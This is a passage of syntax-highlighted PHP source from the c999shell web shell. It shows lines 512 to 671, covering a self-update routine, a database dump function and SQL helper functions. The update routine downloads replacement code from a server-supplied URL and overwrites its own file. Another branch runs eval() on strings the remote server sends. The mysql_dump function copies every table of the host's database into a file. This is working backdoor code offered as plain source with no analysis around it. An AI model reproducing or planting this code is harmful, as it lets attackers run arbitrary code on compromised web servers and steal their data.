<span class="lineno"> 512</span>   <span class="nv">$string</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">}));</span>
<span class="lineno"> 513</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 514</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;You are using latest version!&quot;</span><span class="p">;}</span>
<span class="lineno"> 515</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="lineno"> 516</span>   <span class="p">{</span>
<span class="lineno"> 517</span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
<span class="lineno"> 518</span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$update</span><span class="p">)</span>
<span class="lineno"> 519</span>    <span class="p">{</span>
<span class="lineno"> 520</span>     <span class="nv">$confvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 521</span>     <span class="nv">$sourceurl</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno"> 522</span>     <span class="nv">$source</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sourceurl</span><span class="p">);</span>
<span class="lineno"> 523</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$source</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Can&#39;t fetch update!&quot;</span><span class="p">;}</span>
<span class="lineno"> 524</span>     <span class="k">else</span>
<span class="lineno"> 525</span>     <span class="p">{</span>
<span class="lineno"> 526</span>      <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 527</span>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Local error: can&#39;t write update to &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;! You may download c999shell.php manually &lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sourceurl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;span style=&quot;</span><span class="nx">text</span><span class="o">-</span><span class="nx">decoration</span><span class="o">:</span> <span class="nx">underline</span><span class="p">;</span><span class="s2">&quot;&gt;here&lt;/span&gt;&lt;/a&gt;.&quot;</span><span class="p">;}</span>
<span class="lineno"> 528</span>      <span class="k">else</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$source</span><span class="p">);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> <span class="k">return</span> <span class="s2">&quot;Thanks! Updated with success.&quot;</span><span class="p">;}</span>
<span class="lineno"> 529</span>     <span class="p">}</span>
<span class="lineno"> 530</span>    <span class="p">}</span>
<span class="lineno"> 531</span>    <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;New version are available: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">[</span><span class="mi">1</span><span class="p">];}</span>
<span class="lineno"> 532</span>   <span class="p">}</span>
<span class="lineno"> 533</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x04</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">eval</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;}</span>
<span class="lineno"> 534</span>   <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error in protocol: segmentation failed! (&quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot;) &quot;</span><span class="p">;}</span>
<span class="lineno"> 535</span>  <span class="p">}</span>
<span class="lineno"> 536</span> <span class="p">}</span>
<span class="lineno"> 537</span> <span class="p">}</span>
<span class="lineno"> 538</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_dump&quot;</span><span class="p">))</span>
<span class="lineno"> 539</span> <span class="p">{</span>
<span class="lineno"> 540</span> <span class="k">function</span> <span class="nf">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">)</span>
<span class="lineno"> 541</span> <span class="p">{</span>
<span class="lineno"> 542</span>  <span class="k">global</span> <span class="nv">$shver</span><span class="p">;</span>
<span class="lineno"> 543</span>  <span class="nv">$sock</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">];</span>
<span class="lineno"> 544</span>  <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">];</span>
<span class="lineno"> 545</span>  <span class="nv">$print</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">];</span>
<span class="lineno"> 546</span>  <span class="nv">$nl2br</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">];</span>
<span class="lineno"> 547</span>  <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
<span class="lineno"> 548</span>  <span class="nv">$add_drop</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">];</span>
<span class="lineno"> 549</span>  <span class="nv">$tabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;tabs&quot;</span><span class="p">];</span>
<span class="lineno"> 550</span>  <span class="nv">$onlytabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">];</span>
<span class="lineno"> 551</span>  <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 552</span>  <span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 553</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Error: </span><span class="se">\$</span><span class="s2">sock is not valid resource.&quot;</span><span class="p">);}</span>
<span class="lineno"> 554</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="p">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;}</span>
<span class="lineno"> 555</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$print</span><span class="p">))</span> <span class="p">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
<span class="lineno"> 556</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$nl2br</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
<span class="lineno"> 557</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
<span class="lineno"> 558</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
<span class="lineno"> 559</span>  <span class="p">{</span>
<span class="lineno"> 560</span>   <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span>
<span class="lineno"> 561</span>  <span class="p">}</span>
<span class="lineno"> 562</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 563</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
<span class="lineno"> 564</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
<span class="lineno"> 565</span>  <span class="p">{</span>
<span class="lineno"> 566</span>   <span class="c1">// retrive tables-list</span>
<span class="lineno"> 567</span>   <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM &quot;</span><span class="o">.</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno"> 568</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];}}</span>
<span class="lineno"> 569</span>  <span class="p">}</span>
<span class="lineno"> 570</span>  <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;# Dumped by c999Shell.SQL v. &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 571</span> <span class="s2"># Home page: http://ccteam.ru</span>
<span class="lineno"> 572</span> <span class="s2">#</span>
<span class="lineno"> 573</span> <span class="s2"># Host settings:</span>
<span class="lineno"> 574</span> <span class="s2"># MySQL version: (&quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running on &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 575</span> <span class="s2"># Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 576</span> <span class="s2"># DB: </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"></span>
<span class="lineno"> 577</span> <span class="s2">#---------------------------------------------------------</span>
<span class="lineno"> 578</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 579</span>  <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$onlytabs</span><span class="p">);</span>
<span class="lineno"> 580</span>  <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span>
<span class="lineno"> 581</span>  <span class="p">{</span>
<span class="lineno"> 582</span>   <span class="k">if</span> <span class="p">((</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$onlytabs</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">))</span>
<span class="lineno"> 583</span>   <span class="p">{</span>
<span class="lineno"> 584</span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$add_drop</span><span class="p">)</span> <span class="p">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
<span class="lineno"> 585</span>    <span class="c1">// recieve query for create table structure</span>
<span class="lineno"> 586</span>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno"> 587</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
<span class="lineno"> 588</span>    <span class="k">else</span>
<span class="lineno"> 589</span>    <span class="p">{</span>
<span class="lineno"> 590</span>     <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno"> 591</span>     <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 592</span>     <span class="c1">// recieve table variables</span>
<span class="lineno"> 593</span>     <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno"> 594</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
<span class="lineno"> 595</span>     <span class="p">{</span>
<span class="lineno"> 596</span>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span>
<span class="lineno"> 597</span>      <span class="p">{</span>
<span class="lineno"> 598</span>       <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
<span class="lineno"> 599</span>       <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
<span class="lineno"> 600</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
<span class="lineno"> 601</span>       <span class="nv">$values</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
<span class="lineno"> 602</span>       <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`&quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot;`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot;&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 603</span>       <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$sql</span><span class="p">;</span>
<span class="lineno"> 604</span>      <span class="p">}</span>
<span class="lineno"> 605</span>     <span class="p">}</span>
<span class="lineno"> 606</span>    <span class="p">}</span>
<span class="lineno"> 607</span>   <span class="p">}</span>
<span class="lineno"> 608</span>  <span class="p">}</span>
<span class="lineno"> 609</span>  <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;#---------------------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 610</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
<span class="lineno"> 611</span>  <span class="p">{</span>
<span class="lineno"> 612</span>   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 613</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;}</span>
<span class="lineno"> 614</span>   <span class="k">else</span>
<span class="lineno"> 615</span>   <span class="p">{</span>
<span class="lineno"> 616</span>    <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
<span class="lineno"> 617</span>    <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 618</span>   <span class="p">}</span>
<span class="lineno"> 619</span>  <span class="p">}</span>
<span class="lineno"> 620</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$print</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$nl2br</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$out</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$out</span><span class="p">;}}</span>
<span class="lineno"> 621</span>  <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="lineno"> 622</span> <span class="p">}</span>
<span class="lineno"> 623</span> <span class="p">}</span>
<span class="lineno"> 624</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_buildwhere&quot;</span><span class="p">))</span>
<span class="lineno"> 625</span> <span class="p">{</span>
<span class="lineno"> 626</span> <span class="k">function</span> <span class="nf">mysql_buildwhere</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="nv">$sep</span><span class="o">=</span><span class="s2">&quot; and&quot;</span><span class="p">,</span><span class="nv">$functs</span><span class="o">=</span><span class="k">array</span><span class="p">())</span>
<span class="lineno"> 627</span> <span class="p">{</span>
<span class="lineno"> 628</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 629</span>  <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 630</span>  <span class="k">foreach</span><span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span>
<span class="lineno"> 631</span>  <span class="p">{</span>
<span class="lineno"> 632</span>   <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 633</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;}</span>
<span class="lineno"> 634</span>   <span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno"> 635</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span>
<span class="lineno"> 636</span>   <span class="nv">$result</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;` = &quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$sep</span><span class="p">;</span>
<span class="lineno"> 637</span>  <span class="p">}</span>
<span class="lineno"> 638</span>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sep</span><span class="p">));</span>
<span class="lineno"> 639</span>  <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="lineno"> 640</span> <span class="p">}</span>
<span class="lineno"> 641</span> <span class="p">}</span>
<span class="lineno"> 642</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_fetch_all&quot;</span><span class="p">))</span>
<span class="lineno"> 643</span> <span class="p">{</span>
<span class="lineno"> 644</span> <span class="k">function</span> <span class="nf">mysql_fetch_all</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span>
<span class="lineno"> 645</span> <span class="p">{</span>
<span class="lineno"> 646</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
<span class="lineno"> 647</span>  <span class="k">else</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);}</span>
<span class="lineno"> 648</span>  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 649</span>  <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
<span class="lineno"> 650</span>  <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 651</span>  <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
<span class="lineno"> 652</span> <span class="p">}</span>
<span class="lineno"> 653</span> <span class="p">}</span>
<span class="lineno"> 654</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_smarterror&quot;</span><span class="p">))</span>
<span class="lineno"> 655</span> <span class="p">{</span>
<span class="lineno"> 656</span> <span class="k">function</span> <span class="nf">mysql_smarterror</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span>
<span class="lineno"> 657</span> <span class="p">{</span>
<span class="lineno"> 658</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);}</span>
<span class="lineno"> 659</span>  <span class="k">else</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();}</span>
<span class="lineno"> 660</span>  <span class="nv">$error</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
<span class="lineno"> 661</span>  <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
<span class="lineno"> 662</span> <span class="p">}</span>
<span class="lineno"> 663</span> <span class="p">}</span>
<span class="lineno"> 664</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_query_form&quot;</span><span class="p">))</span>
<span class="lineno"> 665</span> <span class="p">{</span>
<span class="lineno"> 666</span> <span class="k">function</span> <span class="nf">mysql_query_form</span><span class="p">()</span>
<span class="lineno"> 667</span> <span class="p">{</span>
<span class="lineno"> 668</span>  <span class="k">global</span> <span class="nv">$submit</span><span class="p">,</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_query_result</span><span class="p">,</span><span class="nv">$sql_confirm</span><span class="p">,</span><span class="nv">$sql_query_error</span><span class="p">,</span><span class="nv">$tbl_struct</span><span class="p">;</span>
<span class="lineno"> 669</span>  <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Error:&lt;/b&gt;</span>
<span class="lineno"> 670</span> <span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 671</span> <span class="s2">&quot;</span><span class="p">;}</span>
